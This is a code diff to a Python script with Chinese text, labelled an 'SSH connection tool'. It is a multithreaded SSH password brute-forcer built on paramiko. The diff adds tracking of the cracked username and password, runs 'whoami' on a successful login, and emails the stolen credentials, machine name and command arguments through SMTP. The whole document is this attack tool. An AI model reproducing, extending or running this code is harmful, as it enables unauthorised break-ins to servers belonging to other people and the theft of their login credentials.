@@ -3,9 +3,9 @@
 
 import os
 os.environ['PYTHONWARNINGS'] = 'ignore::DeprecationWarning'
+
 import warnings
 from cryptography.utils import CryptographyDeprecationWarning
-
 warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)
 
 import paramiko
@@ -33,7 +33,7 @@ logging.getLogger("paramiko").setLevel(logging.CRITICAL)
 # 程序banner
 BANNER = """
 SSH连接工具
-版本: 2.0
+版本: 2.2
 时间: 2024/7/23
 """
 
@@ -60,18 +60,22 @@ def ssh_connect(hostname, port, username, password):
     except Exception:
         return None
 
-def worker(hostname, q, success_event, attempt_count):
+def worker(hostname, q, success_event, attempt_count, success_info):
     while not q.empty() and not success_event.is_set():
         username, password = q.get()
         with attempt_count.get_lock():
             attempt_count.value += 1
+            print(f"\r当前尝试次数: {attempt_count.value}", end="", flush=True)
         ssh_client = ssh_connect(hostname, 22, username, password)
         if ssh_client:
+            print()  # 打印一个换行，避免覆盖上一行
             stdin, stdout, stderr = ssh_client.exec_command('whoami', timeout=5)
             print(stdout.read().decode('utf-8'))
             ssh_client.close()
             logging.info(f"连接成功！用户名: {username}, 密码: {password}")
             logging.info(f"在成功之前失败了 {attempt_count.value - 1} 次")
+            success_info['username'] = username
+            success_info['password'] = password
             success_event.set()
         q.task_done()
 
@@ -89,21 +93,23 @@ def ssh_client_connection(hostname):
 
     success_event = threading.Event()
     attempt_count = Value('i', 0)
+    success_info = {'username': '', 'password': ''}
     threads = []
     for _ in range(10):  # 使用10个线程
-        t = threading.Thread(target=worker, args=(hostname, q, success_event, attempt_count))
+        t = threading.Thread(target=worker, args=(hostname, q, success_event, attempt_count, success_info))
         t.start()
         threads.append(t)
 
     for t in threads:
         t.join()
 
+    print()  # 打印一个换行，避免覆盖上一行
     if not success_event.is_set():
         logging.warning(f"所有组合都已尝试，连接失败。总共失败 {attempt_count.value} 次")
 
-    return success_event.is_set()
+    return success_event.is_set(), success_info, attempt_count.value
 
-def send_msg():
+def send_msg(success_info, attempt_count):
     """发送邮件通知"""
     try:
         smtp_config = {
@@ -129,7 +135,9 @@ def send_msg():
              来自 {machine_name} 的消息</p>
         <p>路径: {os.getcwd()}<br>
            参数: {' '.join(sys.argv)}</p>
-           您的扫描任务已经完成。
+           <p>您的扫描任务已经完成。</p>
+           <p>连接成功！用户名: {success_info['username']}, 密码: {success_info['password']}</p>
+           <p>在成功之前失败了 {attempt_count - 1} 次</p>
         </body>
         </html>"""
 
@@ -167,9 +175,11 @@ def main():
         hostname = sys.argv[2]
 
     try:
-        success = ssh_client_connection(hostname)
+        success, success_info, attempt_count = ssh_client_connection(hostname)
         if success:
-            send_msg()
+            send_msg(success_info, attempt_count)
+            logging.info("操作成功完成。程序即将退出。")
+            sys.exit(0)
         else:
             logging.warning("操作失败。请检查您的输入和配置。")
     except Exception as e:
